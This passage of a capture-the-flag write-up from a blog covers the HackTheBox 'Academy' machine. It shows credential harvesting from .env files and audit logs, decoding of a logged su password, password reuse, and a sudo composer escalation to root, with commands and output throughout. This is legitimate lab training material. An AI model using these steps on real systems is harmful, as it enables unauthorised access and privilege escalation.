</span></span><span class=line><span class=cl><span class=n>cry0l1t3</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1002</span><span class=p>:</span><span class=mi>1002</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cry0l1t3</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=n>mysql</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>112</span><span class=p>:</span><span class=mi>120</span><span class=p>:</span><span class=n>MySQL</span> <span class=n>Server</span><span class=p>,,,:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=bp>false</span>
</span></span><span class=line><span class=cl><span class=mi>21</span><span class=n>y4d</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1003</span><span class=p>:</span><span class=mi>1003</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=mi>21</span><span class=n>y4d</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=n>ch4p</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1004</span><span class=p>:</span><span class=mi>1004</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>ch4p</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=n>g0blin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1005</span><span class=p>:</span><span class=mi>1005</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>g0blin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span>
</span></span></code></pre></td></tr></table></div></div><p>Then I ran a recursive list in the home directories: <code>ls -lhAR /home</code>.</p><ul><li>21y4d: empty</li><li>ch4p: empty</li><li>cry0l1t3: the user flag is there, and stuff about lxd (useful for pe)<ul><li><code>/home/cry0l1t3/.mysql_history</code> -> we don&rsquo;t have the permission</li></ul></li><li>egre55: empty</li><li>g0blin: empty</li><li>mrb3n: dirty stuff<ul><li><code>/home/mrb3n/.config/composer/.htaccess</code> -> deny from all</li><li><code>/home/mrb3n/.local/share/composer/.htaccess</code> -> deny from all</li></ul></li></ul><p>Connecting to the DB fails with mysql creds found in
<code>/var/www/html/htb-academy-dev-01/.env</code> (same as the Laravel):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>DB_CONNECTION=mysql
</span></span><span class=line><span class=cl>DB_HOST=127.0.0.1
</span></span><span class=line><span class=cl>DB_PORT=3306
</span></span><span class=line><span class=cl>DB_DATABASE=homestead
</span></span><span class=line><span class=cl>DB_USERNAME=homestead
</span></span><span class=line><span class=cl>DB_PASSWORD=secret
</span></span></code></pre></td></tr></table></div></div><p>But with the ones <code>/var/www/html/academy/.env</code> maybe</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>DB_CONNECTION=mysql
</span></span><span class=line><span class=cl>DB_HOST=127.0.0.1
</span></span><span class=line><span class=cl>DB_PORT=3306
</span></span><span class=line><span class=cl>DB_DATABASE=academy
</span></span><span class=line><span class=cl>DB_USERNAME=dev
</span></span><span class=line><span class=cl>DB_PASSWORD=mySup3rP4s5w0rd!!
</span></span></code></pre></td></tr></table></div></div><p>No luck either.</p><p>But I tried to reused the password <code>mySup3rP4s5w0rd!!</code> with user <code>cry0l1t3</code> and
it worked (remember he had a <code>.mysql_history</code> in his home).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat user.txt
</span></span><span class=line><span class=cl>0e85e4538755a8311b08a68026e1ec7b
</span></span><span class=line><span class=cl>$ id
</span></span><span class=line><span class=cl>uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-cry0l1t3-to-mrb3n>Privilege Escalation of Machine : from cry0l1t3 to mrb3n<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-cry0l1t3-to-mrb3n>#</a></h2><p>As we are in <code>adm</code> group I launched a command to see what files
we have access with this group: <code>find / -group adm -type f 2>/dev/null</code>.
We have access to all logs in <code>/var/log</code>.</p><p>There are some interesting files but password are redacted.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>grep</span> <span class=o>-</span><span class=n>ri</span> <span class=n>password</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span> <span class=mi>2</span><span class=o>&gt;/</span><span class=n>dev</span><span class=o>/</span><span class=n>null</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>installer</span><span class=o>/</span><span class=n>subiquity</span><span class=o>-</span><span class=n>debug</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=mi>1758</span><span class=p>:</span><span class=mi>2020</span><span class=o>-</span><span class=mi>08</span><span class=o>-</span><span class=mi>07</span> <span class=mi>12</span><span class=p>:</span><span class=mi>07</span><span class=p>:</span><span class=mi>02</span><span class=p>,</span><span class=mi>431</span> <span class=n>DEBUG</span> <span class=n>subiquity</span><span class=o>.</span><span class=n>controllers</span><span class=o>.</span><span class=n>identity</span><span class=p>:</span><span class=mi>70</span> <span class=n>IdentityController</span><span class=o>.</span><span class=n>done</span> <span class=n>next_screen</span> <span class=n>user_spec</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;hostname&#39;</span><span class=p>:</span> <span class=s1>&#39;academy&#39;</span><span class=p>,</span> <span class=s1>&#39;realname&#39;</span><span class=p>:</span> <span class=s1>&#39;egre55&#39;</span><span class=p>,</span> <span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=s1>&#39;egre55&#39;</span><span class=p>,</span> <span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;REDACTED&gt;&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>cloud</span><span class=o>-</span><span class=n>init</span><span class=o>.</span><span class=n>log</span><span class=p>:</span><span class=mi>2020</span><span class=o>-</span><span class=mi>08</span><span class=o>-</span><span class=mi>07</span> <span class=mi>12</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=mi>07</span><span class=p>,</span><span class=mi>195</span> <span class=o>-</span> <span class=n>util</span><span class=o>.</span><span class=n>py</span><span class=p>[</span><span class=n>DEBUG</span><span class=p>]:</span> <span class=n>Running</span> <span class=n>hidden</span> <span class=n>command</span> <span class=n>to</span> <span class=n>protect</span> <span class=n>sensitive</span> <span class=n>input</span><span class=o>/</span><span class=n>output</span> <span class=n>logstring</span><span class=p>:</span> <span class=p>[</span><span class=s1>&#39;useradd&#39;</span><span class=p>,</span> <span class=s1>&#39;egre55&#39;</span><span class=p>,</span> <span class=s1>&#39;--comment&#39;</span><span class=p>,</span> <span class=s1>&#39;egre55&#39;</span><span class=p>,</span> <span class=s1>&#39;--groups&#39;</span><span class=p>,</span> <span class=s1>&#39;adm,cdrom,dip,plugdev,lxd,sudo&#39;</span><span class=p>,</span> <span class=s1>&#39;--password&#39;</span><span class=p>,</span> <span class=s1>&#39;REDACTED&#39;</span><span class=p>,</span> <span class=s1>&#39;--shell&#39;</span><span class=p>,</span> <span class=s1>&#39;/bin/bash&#39;</span><span class=p>,</span> <span class=s1>&#39;-m&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s possible that <code>/var/log/audit/audit.log</code> is logging password during auth attempts.</p><p>Ref. <a href=https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/>Logging Passwords on Linux</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>grep</span> <span class=o>-</span><span class=n>r</span> <span class=s1>&#39;comm=&#34;sudo&#34;&#39;</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>audit</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>grep</span> <span class=o>-</span><span class=n>r</span> <span class=s1>&#39;comm=&#34;su&#34;&#39;</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>audit</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>audit</span><span class=o>/</span><span class=n>audit</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=mi>3</span><span class=p>:</span><span class=n>type</span><span class=o>=</span><span class=n>TTY</span> <span class=n>msg</span><span class=o>=</span><span class=n>audit</span><span class=p>(</span><span class=mf>1597199293.906</span><span class=p>:</span><span class=mi>84</span><span class=p>):</span> <span class=n>tty</span> <span class=n>pid</span><span class=o>=</span><span class=mi>2520</span> <span class=n>uid</span><span class=o>=</span><span class=mi>1002</span> <span class=n>auid</span><span class=o>=</span><span class=mi>0</span> <span class=n>ses</span><span class=o>=</span><span class=mi>1</span> <span class=n>major</span><span class=o>=</span><span class=mi>4</span> <span class=n>minor</span><span class=o>=</span><span class=mi>1</span> <span class=n>comm</span><span class=o>=</span><span class=s2>&#34;su&#34;</span> <span class=n>data</span><span class=o>=</span><span class=mi>6</span><span class=n>D7262336E5F41634064336D79210A</span>
</span></span></code></pre></td></tr></table></div></div><p>The password is hexadecimal encoded.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ printf %s &#39;6D7262336E5F41634064336D79210A&#39; | xxd -r -p
</span></span><span class=line><span class=cl>mrb3n_Ac@d3my!
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-mrb3n-to-mrb3n>Privilege Escalation of Machine : from mrb3n to mrb3n<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-mrb3n-to-mrb3n>#</a></h2><p><code>mrb3n</code> is a sudoer:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ su  mrb3n
</span></span><span class=line><span class=cl>Password: mrb3n_Ac@d3my!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ id
</span></span><span class=line><span class=cl>uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo -l
</span></span><span class=line><span class=cl>[sudo] password for mrb3n: mrb3n_Ac@d3my!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching Defaults entries for mrb3n on academy:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User mrb3n may run the following commands on academy:
</span></span><span class=line><span class=cl>    (ALL) /usr/bin/composer
</span></span></code></pre></td></tr></table></div></div><p>So let&rsquo;s check a GTFO for that one:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ gtfoblookup update
</span></span><span class=line><span class=cl>$ gtfoblookup linux sudo composer
</span></span><span class=line><span class=cl>composer:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    sudo:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        Code: TF=$(mktemp -d)
</span></span><span class=line><span class=cl>              echo &#39;{&#34;scripts&#34;:{&#34;x&#34;:&#34;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&#34;}}&#39;
</span></span><span class=line><span class=cl>              &gt;$TF/composer.json
</span></span><span class=line><span class=cl>              sudo composer --working-dir=$TF run-script x
</span></span></code></pre></td></tr></table></div></div><p>So let&rsquo;s do that:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>TF</span><span class=o>=$</span><span class=p>(</span><span class=n>mktemp</span> <span class=o>-</span><span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>echo</span> <span class=s1>&#39;{&#34;scripts&#34;:{&#34;x&#34;:&#34;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&#34;}}&#39;</span><span class=o>&gt;$</span><span class=n>TF</span><span class=o>/</span><span class=n>composer</span><span class=o>.</span><span class=n>json</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>sudo</span> <span class=n>composer</span> <span class=o>--</span><span class=n>working</span><span class=o>-</span><span class=n>dir</span><span class=o>=$</span><span class=n>TF</span> <span class=n>run</span><span class=o>-</span><span class=n>script</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>                                              <span class=n>sudo</span> <span class=n>composer</span> <span class=o>--</span><span class=n>working</span><span class=o>-</span><span class=n>dir</span><span class=o>=$</span><span class=n>TF</span> <span class=n>run</span><span class=o>-</span><span class=n>script</span> <span class=n>x</span>
</span></span><span class=line><span class=cl><span class=n>PHP</span> <span class=n>Warning</span><span class=p>:</span>  <span class=n>PHP</span> <span class=n>Startup</span><span class=p>:</span> <span class=n>Unable</span> <span class=n>to</span> <span class=nb>load</span> <span class=n>dynamic</span> <span class=n>library</span> <span class=s1>&#39;mysqli.so&#39;</span> <span class=p>(</span><span class=n>tried</span><span class=p>:</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=mi>20190902</span><span class=o>/</span><span class=n>mysqli</span><span class=o>.</span><span class=n>so</span> <span class=p>(</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=mi>20190902</span><span class=o>/</span><span class=n>mysqli</span><span class=o>.</span><span class=n>so</span><span class=p>:</span> <span class=n>undefined</span> <span class=n>symbol</span><span class=p>:</span> <span class=n>mysqlnd_global_stats</span><span class=p>),</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=mi>20190902</span><span class=o>/</span><span class=n>mysqli</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=n>so</span> <span class=p>(</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=mi>20190902</span><span class=o>/</span><span class=n>mysqli</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=n>so</span><span class=p>:</span> <span class=n>cannot</span> <span class=n>open</span> <span class=n>shared</span> <span class=n>object</span> <span class=n>file</span><span class=p>:</span> <span class=n>No</span> <span class=n>such</span> <span class=n>file</span> <span class=ow>or</span> <span class=n>directory</span><span class=p>))</span> <span class=ow>in</span> <span class=n>Unknown</span> <span class=n>on</span> <span class=n>line</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>PHP</span> <span class=n>Warning</span><span class=p>:</span>  <span class=n>PHP</span> <span class=n>Startup</span><span class=p>:</span> <span class=n>Unable</span> <span class=n>to</span> <span class=nb>load</span> <span class=n>dynamic</span> <span class=n>library</span> <span class=s1>&#39;pdo_mysql.so&#39;</span> <span class=p>(</span><span class=n>tried</span><span class=p>:</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=mi>20190902</span><span class=o>/</span><span class=n>pdo_mysql</span><span class=o>.</span><span class=n>so</span> <span class=p>(</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=mi>20190902</span><span class=o>/</span><span class=n>pdo_mysql</span><span class=o>.</span><span class=n>so</span><span class=p>:</span> <span class=n>undefined</span> <span class=n>symbol</span><span class=p>:</span> <span class=n>mysqlnd_allocator</span><span class=p>),</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=mi>20190902</span><span class=o>/</span><span class=n>pdo_mysql</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=n>so</span> <span class=p>(</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>php</span><span class=o>/</span><span class=mi>20190902</span><span class=o>/</span><span class=n>pdo_mysql</span><span class=o>.</span><span class=n>so</span><span class=o>.</span><span class=n>so</span><span class=p>:</span> <span class=n>cannot</span> <span class=n>open</span> <span class=n>shared</span> <span class=n>object</span> <span class=n>file</span><span class=p>:</span> <span class=n>No</span> <span class=n>such</span> <span class=n>file</span> <span class=ow>or</span> <span class=n>directory</span><span class=p>))</span> <span class=ow>in</span> <span class=n>Unknown</span> <span class=n>on</span> <span class=n>line</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>Do</span> <span class=ow>not</span> <span class=n>run</span> <span class=n>Composer</span> <span class=n>as</span> <span class=n>root</span><span class=o>/</span><span class=n>super</span> <span class=n>user</span><span class=o>!</span> <span class=n>See</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>getcomposer</span><span class=o>.</span><span class=n>org</span><span class=o>/</span><span class=n>root</span> <span class=k>for</span> <span class=n>details</span>
</span></span><span class=line><span class=cl><span class=o>&gt;</span> <span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span> <span class=o>-</span><span class=n>i</span> <span class=mi>0</span><span class=o>&lt;&amp;</span><span class=mi>3</span> <span class=mi>1</span><span class=o>&gt;&amp;</span><span class=mi>3</span> <span class=mi>2</span><span class=o>&gt;&amp;</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=c1># id</span>
</span></span><span class=line><span class=cl>    <span class=n>id</span>
</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>0</span><span class=p>(</span><span class=n>root</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># cat /root/root.txt</span>
</span></span><span class=line><span class=cl>                    <span class=n>cat</span> <span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>root</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=mi>9</span><span class=n>ba239e4f7e863aeaec4558360d77078</span>
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>